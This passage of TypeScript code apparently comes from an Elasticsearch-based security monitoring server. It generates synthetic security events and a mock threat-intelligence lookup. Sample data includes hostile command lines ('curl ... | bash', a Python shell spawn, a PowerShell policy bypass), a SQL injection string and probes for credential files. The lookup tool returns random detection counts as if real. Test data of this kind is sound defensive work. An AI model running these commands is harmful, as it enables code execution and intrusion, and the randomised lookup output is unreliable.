  function parseIpRanges(ipRangeStr: string): string[] {
    // For simplicity, just return a list of sample IPs
    // In a real implementation, this would parse CIDR ranges
    const privateIps = [
      "10.0.0.1", "10.1.1.1", "10.10.10.10", "10.20.30.40",
      "172.16.0.1", "172.16.10.10", "172.16.20.30",
      "192.168.1.1", "192.168.1.100", "192.168.10.10"
    ];

    const publicIps = [
      "8.8.8.8", "1.1.1.1", "203.0.113.1", "203.0.113.2",
      "198.51.100.1", "198.51.100.2", "192.0.2.1", "192.0.2.2"
    ];

    return ipRangeStr.includes("0.0.0.0/0") ? [...privateIps, ...publicIps] : privateIps;
  }

  function getCategoryFromEventType(eventType: string): string {
    switch (eventType) {
      case "authentication": return "authentication";
      case "network_traffic": return "network";
      case "firewall": return "network";
      case "file_access": return "file";
      case "process": return "process";
      case "intrusion_detection": return "intrusion_detection";
      case "dns": return "network";
      case "tls": return "network";
      case "http": return "web";
      default: return "event";
    }
  }

  function generateHostname(): string {
    const prefixes = ["srv", "web", "db", "app", "mail", "auth", "proxy", "fw", "dns"];
    const environments = ["prod", "dev", "test", "staging"];
    const numbers = ["01", "02", "03", "1", "2", "3"];

    return `${getRandomItem(prefixes)}-${getRandomItem(environments)}-${getRandomItem(numbers)}`;
  }

  function generateUuid(): string {
    // Simple UUID v4 generator
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getRandomItem<T>(array: T[]): T {
    return array[Math.floor(Math.random() * array.length)];
  }

  function generateAuthenticationEvent(): Record<string, any> {
    const users = ["admin", "john.doe", "jane.smith", "system", "root", "guest"];
    const authMethods = ["password", "public_key", "multi_factor", "oauth", "kerberos"];
    const authServices = ["ssh", "rdp", "web_console", "vpn", "database", "ldap"];

    const isFailure = Math.random() > 0.7;
    const user = getRandomItem(users);

    return {
      "event.action": isFailure ? "authentication_failure" : "authentication_success",
      "event.outcome": isFailure ? "failure" : "success",
      "event.category": ["authentication"],
      "event.type": ["start", "info"],
      "user.name": user,
      "user.id": `u-${Math.floor(Math.random() * 10000)}`,
      "user.domain": "CORP",
      "service.name": getRandomItem(authServices),
      "authentication.method": getRandomItem(authMethods),
      "source.ip": `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      "error.message": isFailure ? getRandomItem([
        "Invalid password",
        "Account locked",
        "User not found",
        "Password expired",
        "Invalid token"
      ]) : undefined
    };
  }

  function generateNetworkTrafficEvent(sourceIps: string[], destinationIps: string[]): Record<string, any> {
    const protocols = ["tcp", "udp", "icmp"];
    const applications = ["http", "https", "ssh", "ftp", "dns", "smb", "rdp"];

    return {
      "event.category": ["network"],
      "event.type": ["connection", "info"],
      "network.protocol": getRandomItem(protocols),
      "network.transport": getRandomItem(protocols),
      "network.application": getRandomItem(applications),
      "network.bytes": Math.floor(Math.random() * 10000),
      "network.packets": Math.floor(Math.random() * 100),
      "network.direction": getRandomItem(["inbound", "outbound"]),
      "source.ip": getRandomItem(sourceIps),
      "source.port": Math.floor(Math.random() * 60000) + 1024,
      "destination.ip": getRandomItem(destinationIps),
      "destination.port": getRandomItem([80, 443, 22, 23, 25, 53, 123, 389, 636, 3389])
    };
  }

  function generateFirewallEvent(sourceIps: string[], destinationIps: string[]): Record<string, any> {
    const actions = ["allow", "deny", "drop", "reject"];
    const rules = ["default-deny", "allow-internal", "block-malicious", "allow-outbound"];

    return {
      "event.category": ["network"],
      "event.type": ["denied", "allowed", "connection"],
      "event.action": getRandomItem(actions),
      "rule.name": getRandomItem(rules),
      "rule.id": `rule-${Math.floor(Math.random() * 1000)}`,
      "source.ip": getRandomItem(sourceIps),
      "source.port": Math.floor(Math.random() * 60000) + 1024,
      "destination.ip": getRandomItem(destinationIps),
      "destination.port": getRandomItem([80, 443, 22, 23, 25, 53, 123, 389, 636, 3389]),
      "network.transport": getRandomItem(["tcp", "udp", "icmp"]),
      "observer.type": "firewall",
      "observer.vendor": getRandomItem(["Cisco", "Fortinet", "Palo Alto", "Check Point", "pfSense"])
    };
  }

  function generateFileAccessEvent(): Record<string, any> {
    const actions = ["open", "create", "modify", "delete", "rename", "permission_change"];
    const filePaths = [
      "/etc/passwd",
      "/etc/shadow",
      "/var/log/auth.log",
      "/home/user/documents/confidential.pdf",
      "C:\\Windows\\System32\\config\\SAM",
      "C:\\Users\\Administrator\\Documents\\financial.xlsx"
    ];
    const users = ["admin", "john.doe", "jane.smith", "system", "root", "guest"];

    return {
      "event.category": ["file"],
      "event.type": ["access", "change"],
      "event.action": getRandomItem(actions),
      "file.path": getRandomItem(filePaths),
      "file.name": getRandomItem(filePaths).split(/[\/\\]/).pop(),
      "file.extension": getRandomItem(filePaths).split('.').pop(),
      "file.size": Math.floor(Math.random() * 10000000),
      "file.created": new Date(Date.now() - Math.floor(Math.random() * 30 * 24 * 60 * 60 * 1000)).toISOString(),
      "file.mtime": new Date(Date.now() - Math.floor(Math.random() * 7 * 24 * 60 * 60 * 1000)).toISOString(),
      "file.accessed": new Date().toISOString(),
      "user.name": getRandomItem(users),
      "process.name": getRandomItem(["explorer.exe", "cmd.exe", "powershell.exe", "bash", "sudo", "cat"])
    };
  }

  function generateProcessEvent(): Record<string, any> {
    const processNames = ["cmd.exe", "powershell.exe", "svchost.exe", "explorer.exe", "bash", "sudo", "python", "java"];
    const processActions = ["start", "stop", "info"];
    const commandLines = [
      "powershell.exe -ExecutionPolicy Bypass -Command ...",
      "cmd.exe /c whoami",
      "bash -c 'curl -s https://example.com | bash'",
      "python -c 'import os; os.system(\"/bin/bash\")'",
      "java -jar malicious.jar",
      "svchost.exe -k netsvcs"
    ];

    return {
      "event.category": ["process"],
      "event.type": [getRandomItem(processActions)],
      "process.pid": Math.floor(Math.random() * 10000),
      "process.name": getRandomItem(processNames),
      "process.executable": getRandomItem(processNames).includes(".exe")
        ? `C:\\Windows\\System32\\${getRandomItem(processNames)}`
        : `/usr/bin/${getRandomItem(processNames)}`,
      "process.command_line": getRandomItem(commandLines),
      "process.parent.pid": Math.floor(Math.random() * 10000),
      "process.parent.name": getRandomItem(["explorer.exe", "systemd", "init", "launchd"]),
      "user.name": getRandomItem(["admin", "root", "system", "john.doe"]),
      "process.hash.md5": Array(32).fill(0).map(x => Math.floor(Math.random() * 16).toString(16)).join(''),
      "process.hash.sha1": Array(40).fill(0).map(x => Math.floor(Math.random() * 16).toString(16)).join(''),
      "process.hash.sha256": Array(64).fill(0).map(x => Math.floor(Math.random() * 16).toString(16)).join('')
    };
  }

  function generateIntrusionDetectionEvent(sourceIps: string[], destinationIps: string[]): Record<string, any> {
    const signatures = [
      "ET EXPLOIT Possible CVE-2021-44228 Log4j Remote Code Execution",
      "INDICATOR-SCAN Port Scan Activity",
      "MALWARE Suspicious User Agent",
      "SQL Injection Attempt",
      "XSS Attack Detected",
      "Known Malicious IP Traffic",
      "Command Injection Attempt"
    ];

    const severities = ["low", "medium", "high", "critical"];
    const categories = ["reconnaissance", "exploitation", "malware", "command_and_control", "exfiltration"];

    return {
      "event.category": ["intrusion_detection"],
      "event.type": ["info", "alert"],
      "event.severity": Math.floor(Math.random() * 4) + 1,
      "rule.name": getRandomItem(signatures),
      "rule.category": getRandomItem(categories),
      "rule.id": `sid-${Math.floor(Math.random() * 1000000)}`,
      "rule.version": `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`,
      "source.ip": getRandomItem(sourceIps),
      "source.port": Math.floor(Math.random() * 60000) + 1024,
      "destination.ip": getRandomItem(destinationIps),
      "destination.port": getRandomItem([80, 443, 22, 23, 25, 53, 123, 389, 636, 3389]),
      "network.protocol": getRandomItem(["tcp", "udp", "icmp"]),
      "alert.severity": getRandomItem(severities),
      "observer.type": "ids",
      "observer.vendor": getRandomItem(["Suricata", "Snort", "Cisco", "Palo Alto", "Elastic"])
    };
  }

  function generateDnsEvent(sourceIps: string[], destinationIps: string[]): Record<string, any> {
    const queryTypes = ["A", "AAAA", "CNAME", "MX", "TXT", "NS", "SOA", "PTR"];
    const domains = [
      "example.com",
      "google.com",
      "malicious-domain.com",
      "internal.corp",
      "cdn.service.com",
      "api.service.com"
    ];

    const resolved = Math.random() > 0.1;

    return {
      "event.category": ["network"],
      "event.type": ["info", "connection"],
      "event.action": "dns_query",
      "event.outcome": resolved ? "success" : "failure",
      "dns.question.name": getRandomItem(domains),
      "dns.question.type": getRandomItem(queryTypes),
      "dns.question.class": "IN",
      "dns.header_flags": ["RD", "RA"],
      "dns.response_code": resolved ? "NOERROR" : "NXDOMAIN",
      "dns.answers": resolved ? [
        {
          "data": getRandomItem(destinationIps),
          "name": getRandomItem(domains),
          "type": "A"
        }
      ] : [],
      "source.ip": getRandomItem(sourceIps),
      "source.port": Math.floor(Math.random() * 60000) + 1024,
      "destination.ip": getRandomItem(["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]),
      "destination.port": 53
    };
  }

  function generateTlsEvent(sourceIps: string[], destinationIps: string[]): Record<string, any> {
    const versions = ["TLSv1", "TLSv1.1", "TLSv1.2", "TLSv1.3"];
    const cipherSuites = [
      "TLS_AES_256_GCM_SHA384",
      "TLS_CHACHA20_POLY1305_SHA256",
      "TLS_AES_128_GCM_SHA256",
      "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
      "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
    ];

    const domains = [
      "example.com",
      "google.com",
      "internal.corp",
      "api.service.com"
    ];

    return {
      "event.category": ["network"],
      "event.type": ["connection", "info", "protocol"],
      "network.protocol": "tls",
      "tls.version": getRandomItem(versions),
      "tls.cipher": getRandomItem(cipherSuites),
      "tls.established": true,
      "tls.server.x509.subject.common_name": getRandomItem(domains),
      "tls.server.x509.issuer.common_name": getRandomItem([
        "Let's Encrypt Authority X3",
        "DigiCert SHA2 Secure Server CA",
        "Comodo RSA Domain Validation Secure Server CA"
      ]),
      "tls.server.x509.not_before": new Date(Date.now() - 90 * 24 * 60 * 60 * 1000).toISOString(),
      "tls.server.x509.not_after": new Date(Date.now() + 275 * 24 * 60 * 60 * 1000).toISOString(),
      "tls.server.ja3s": Array(32).fill(0).map(x => Math.floor(Math.random() * 16).toString(16)).join(''),
      "tls.client.ja3": Array(32).fill(0).map(x => Math.floor(Math.random() * 16).toString(16)).join(''),
      "source.ip": getRandomItem(sourceIps),
      "source.port": Math.floor(Math.random() * 60000) + 1024,
      "destination.ip": getRandomItem(destinationIps),
      "destination.port": 443
    };
  }

  function generateHttpEvent(sourceIps: string[], destinationIps: string[]): Record<string, any> {
    const methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"];
    const statusCodes = [200, 201, 204, 301, 302, 400, 401, 403, 404, 500, 503];
    const paths = [
      "/api/v1/users",
      "/api/v1/auth",
      "/login",
      "/admin",
      "/dashboard",
      "/assets/js/analytics.js",
      "/wp-login.php",
      "/.env",
      "/etc/passwd"
    ];

    const userAgents = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
      "curl/7.64.1",
      "Googlebot/2.1 (+http://www.google.com/bot.html)",
      "python-requests/2.25.1"
    ];

    return {
      "event.category": ["web"],
      "event.type": ["access", "info"],
      "http.request.method": getRandomItem(methods),
      "http.response.status_code": getRandomItem(statusCodes),
      "http.request.referrer": Math.random() > 0.5 ? `https://${getRandomItem(["google.com", "example.com", "referer.com"])}/` : undefined,
      "url.path": getRandomItem(paths),
      "url.query": Math.random() > 0.7 ? "id=1' OR 1=1--" : undefined,
      "url.domain": getRandomItem(["example.com", "api.service.com", "app.internal"]),
      "url.scheme": "https",
      "user_agent.original": getRandomItem(userAgents),
      "source.ip": getRandomItem(sourceIps),
      "source.port": Math.floor(Math.random() * 60000) + 1024,
      "destination.ip": getRandomItem(destinationIps),
      "destination.port": getRandomItem([80, 443, 8080, 8443]),
      "http.request.body.content": Math.random() > 0.7 ? JSON.stringify({
        username: "admin",
        password: "password123"
      }) : undefined,
      "network.bytes": Math.floor(Math.random() * 10000)
    };
  }

  function getEcsMappingsForEventType(eventType: string): Record<string, any> {
    // Return basic ECS mappings for the given event type
    // This is a simplified version - a real implementation would include more comprehensive mappings
    return {
      "properties": {
        "@timestamp": { "type": "date" },
        "event": {
          "properties": {
            "created": { "type": "date" },
            "kind": { "type": "keyword" },
            "category": { "type": "keyword" },
            "type": { "type": "keyword" },
            "outcome": { "type": "keyword" },
            "action": { "type": "keyword" },
            "severity": { "type": "long" }
          }
        },
        "host": {
          "properties": {
            "name": { "type": "keyword" },
            "id": { "type": "keyword" },
            "ip": { "type": "ip" }
          }
        },
        "source": {
          "properties": {
            "ip": { "type": "ip" },
            "port": { "type": "long" }
          }
        },
        "destination": {
          "properties": {
            "ip": { "type": "ip" },
            "port": { "type": "long" }
          }
        },
        "user": {
          "properties": {
            "name": { "type": "keyword" },
            "id": { "type": "keyword" },
            "domain": { "type": "keyword" }
          }
        },
        "network": {
          "properties": {
            "protocol": { "type": "keyword" },
            "transport": { "type": "keyword" },
            "application": { "type": "keyword" },
            "bytes": { "type": "long" },
            "packets": { "type": "long" },
            "direction": { "type": "keyword" }
          }
        },
        "observer": {
          "properties": {
            "type": { "type": "keyword" },
            "vendor": { "type": "keyword" }
          }
        },
        "file": {
          "properties": {
            "path": { "type": "keyword" },
            "name": { "type": "keyword" },
            "extension": { "type": "keyword" },
            "size": { "type": "long" },
            "created": { "type": "date" },
            "mtime": { "type": "date" },
            "accessed": { "type": "date" }
          }
        },
        "process": {
          "properties": {
            "pid": { "type": "long" },
            "name": { "type": "keyword" },
            "executable": { "type": "keyword" },
            "command_line": { "type": "text" }
          }
        },
        "dns": {
          "properties": {
            "question": {
              "properties": {
                "name": { "type": "keyword" },
                "type": { "type": "keyword" },
                "class": { "type": "keyword" }
              }
            },
            "response_code": { "type": "keyword" }
          }
        },
        "tls": {
          "properties": {
            "version": { "type": "keyword" },
            "cipher": { "type": "keyword" },
            "established": { "type": "boolean" }
          }
        },
        "http": {
          "properties": {
            "request": {
              "properties": {
                "method": { "type": "keyword" },
                "referrer": { "type": "keyword" },
                "body": {
                  "properties": {
                    "content": { "type": "text" }
                  }
                }
              }
            },
            "response": {
              "properties": {
                "status_code": { "type": "long" }
              }
            }
          }
        },
        "url": {
          "properties": {
            "path": { "type": "keyword" },
            "query": { "type": "keyword" },
            "domain": { "type": "keyword" },
            "scheme": { "type": "keyword" }
          }
        },
        "user_agent": {
          "properties": {
            "original": { "type": "text" }
          }
        }
      }
    };
  }

  // Tool 14: Threat Intelligence Lookup
  server.tool(
    "lookup_ioc",
    "Check indicators of compromise against threat intelligence sources",
    {
      ioc: z
        .string()
        .trim()
        .min(1, "Indicator is required")
        .describe("Indicator to check (hash, IP, domain, URL)"),

      type: z
        .enum(["hash", "ip", "domain", "url"])
        .describe("Type of indicator"),

      sources: z
        .array(z.enum(["virustotal", "alienvault", "all"]))
        .default(["all"])
        .describe("Intelligence sources to query")
    },
    async ({ ioc, type, sources = ["all"] }) => {
      try {
        // Validate indicator format based on type
        if (!validateIndicator(ioc, type)) {
          return {
            content: [
              {
                type: "text" as const,
                text: `Error: Invalid format for ${type}. Please check and try again.`,
              },
            ],
          };
        }

        // Determine which sources to query
        const sourcesToQuery = sources.includes("all")
          ? ["virustotal", "alienvault"]
          : sources;

        // Initialize results
        const results: Record<string, any> = {};

        // Query each source
        for (const source of sourcesToQuery) {
          try {
            switch (source) {
              case "virustotal":
                results.virustotal = await queryVirusTotal(ioc, type);
                break;
              case "alienvault":
                results.alienvault = await queryAlienVault(ioc, type);
                break;
            }
          } catch (error) {
            results[source] = {
              error: true,
              message: error instanceof Error ? error.message : String(error)
            };
          }
        }

        // Format the results
        const formattedResults = formatThreatIntelResults(results, ioc, type);

        return {
          content: [
            {
              type: "text" as const,
              text: `Threat Intelligence Results for ${type}: ${ioc}`,
            },
            {
              type: "text" as const,
              text: formattedResults,
            },
          ],
        };
      } catch (error) {
        console.error(
          `Threat intelligence lookup failed: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Helper functions for threat intelligence

  function validateIndicator(ioc: string, type: string): boolean {
    switch (type) {
      case "hash":
        // MD5 (32 chars), SHA-1 (40 chars), or SHA-256 (64 chars) hash
        return /^[a-fA-F0-9]{32}$|^[a-fA-F0-9]{40}$|^[a-fA-F0-9]{64}$/.test(ioc);
      case "ip":
        // IPv4 address
        return /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ioc);
      case "domain":
        // Domain name
        return /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,}$/.test(ioc);
      case "url":
        // URL
        try {
          new URL(ioc);
          return true;
        } catch {
          return false;
        }
      default:
        return false;
    }
  }

  async function queryVirusTotal(ioc: string, type: string): Promise<any> {
    // Check if VirusTotal API key is available
    const apiKey = process.env.VIRUSTOTAL_API_KEY;
    if (!apiKey) {
      throw new Error("VirusTotal API key not configured. Set VIRUSTOTAL_API_KEY environment variable.");
    }

    // Use node-fetch or another HTTP client to call VirusTotal API
    // This is a mock implementation - in a real scenario, you would use the actual API

    // Mock response for demonstration purposes
    const vtResponse = {
      response_code: 1,
      verbose_msg: "Successfully checked indicator",
      resource: ioc,
      positives: Math.floor(Math.random() * 30),  // Random number of detections (0-30)
      total: 60,
      scan_date: new Date().toISOString(),
      scans: {
        "Antivirus1": { detected: true, result: "Trojan.Generic" },
        "Antivirus2": { detected: false, result: null },
        "Antivirus3": { detected: true, result: "Malicious.File.123" }
      }
    };

    return vtResponse;
  }

  async function queryAlienVault(ioc: string, type: string): Promise<any> {
    // Check if AlienVault OTX API key is available
    const apiKey = process.env.ALIENVAULT_API_KEY;
    if (!apiKey) {
      throw new Error("AlienVault OTX API key not configured. Set ALIENVAULT_API_KEY environment variable.");
    }

    // Mock implementation
    // In a real scenario, you would call the OTX API using their SDK or direct HTTP calls

    // Mock response
    const otxResponse = {
      pulse_count: Math.floor(Math.random() * 10),  // Random number of pulses
      pulses: [
        {
          name: "Malicious Campaign Example",
          tags: ["malware", "ransomware", "botnet"],
          created: new Date().toISOString(),
          attack_ids: ["T1566", "T1027"],
          malware_families: ["Loki", "TrickBot"],
          industries: ["Finance", "Healthcare"]
        }
      ],
      reputation: Math.random() > 0.5 ? -1 : 0,  // -1 = malicious, 0 = unknown
      first_seen: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString()  // Random date within last 30 days
    };

    return otxResponse;
  }

  function formatThreatIntelResults(results: Record<string, any>, ioc: string, type: string): string {
    let formattedOutput = "";
    let maliciousCount = 0;
    let sourceCount = 0;

    // Format VirusTotal results
    if (results.virustotal) {
      sourceCount++;
      if (results.virustotal.error) {
        formattedOutput += `\n## VirusTotal\nError: ${results.virustotal.message}\n`;
      } else {
        const vt = results.virustotal;
        const detectionRatio = `${vt.positives}/${vt.total}`;
        const detectionPercentage = Math.round((vt.positives / vt.total) * 100);

        if (vt.positives > 0) maliciousCount++;

        formattedOutput += `\n## VirusTotal\n`;
        formattedOutput += `Detection ratio: ${detectionRatio} (${detectionPercentage}%)\n`;
        formattedOutput += `Scan date: ${vt.scan_date}\n`;

        if (vt.positives > 0) {
          formattedOutput += `\nPositive detections:\n`;
          for (const [scanner, result] of Object.entries(vt.scans)) {
            if ((result as any).detected) {
              formattedOutput += `- ${scanner}: ${(result as any).result}\n`;
            }
          }
        }
      }
    }

    // Format AlienVault results
    if (results.alienvault) {
      sourceCount++;
      if (results.alienvault.error) {
        formattedOutput += `\n## AlienVault OTX\nError: ${results.alienvault.message}\n`;
      } else {
        const otx = results.alienvault;

        if (otx.reputation < 0 || otx.pulse_count > 0) maliciousCount++;

        formattedOutput += `\n## AlienVault OTX\n`;
        formattedOutput += `Reputation: ${otx.reputation < 0 ? "Malicious" : "Unknown"}\n`;
        formattedOutput += `Pulses: ${otx.pulse_count}\n`;
        formattedOutput += `First seen: ${otx.first_seen}\n`;

        if (otx.pulses && otx.pulses.length > 0) {
          formattedOutput += `\nThreat details:\n`;
          for (const pulse of otx.pulses) {
            formattedOutput += `- ${pulse.name}\n`;
            formattedOutput += `  Tags: ${pulse.tags.join(", ")}\n`;
            if (pulse.malware_families.length > 0) {
              formattedOutput += `  Malware families: ${pulse.malware_families.join(", ")}\n`;
            }
            if (pulse.attack_ids.length > 0) {
              formattedOutput += `  MITRE ATT&CK: ${pulse.attack_ids.join(", ")}\n`;
            }
          }
        }
      }
    }

    // Add summary at the top
    let summary = `Summary: ${ioc} was checked against ${sourceCount} threat intelligence sources.\n`;

    if (maliciousCount > 0) {
      summary += `⚠️ ALERT: This ${type} was flagged as malicious by ${maliciousCount} source(s).\n`;
    } else {
      summary += `✓ This ${type} was not identified as malicious in the checked sources.\n`;
    }

    return summary + formattedOutput;
  }

  return server;
}

const config: ElasticsearchConfig = {
  url: process.env.ES_URL || "",
  apiKey: process.env.ES_API_KEY || "",
  username: process.env.ES_USERNAME || "",
  password: process.env.ES_PASSWORD || "",
  caCert: process.env.ES_CA_CERT || "",
};

async function main() {
  const transport = new StdioServerTransport();
  const server = await createElasticsearchMcpServer(config);

  await server.connect(transport);

  process.on("SIGINT", async () => {
    await server.close();
    process.exit(0);
  });
}

main().catch((error) => {
  console.error(
    "Server error:",
    error instanceof Error ? error.message : String(error)
  );
  process.exit(1);
});
